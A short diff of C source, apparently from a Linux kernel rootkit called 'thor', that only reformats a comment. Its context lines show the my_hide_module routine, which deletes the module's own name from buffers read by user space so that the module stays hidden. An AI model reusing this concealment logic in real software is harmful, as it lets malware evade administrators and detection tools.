@@ -173,8 +173,10 @@ void my_hide_module(char __user *buf, char *module, size_t *len, ssize_t *read_r
 
     if (module_occ != NULL) { /* thor found */
         char *nl;
-        /* find newline and copy the rest of the buffer over the thor
-         * occurrence */
+        /*
+         * find newline and copy the rest of the buffer over the thor
+         * occurrence
+         */
         nl = strnstr(module_occ, "\n", *len - (module_occ - buf));
         memcpy(module_occ, nl+1, *len - ((nl + 1) - buf));
         *read_ret -= (nl+1 - module_occ);
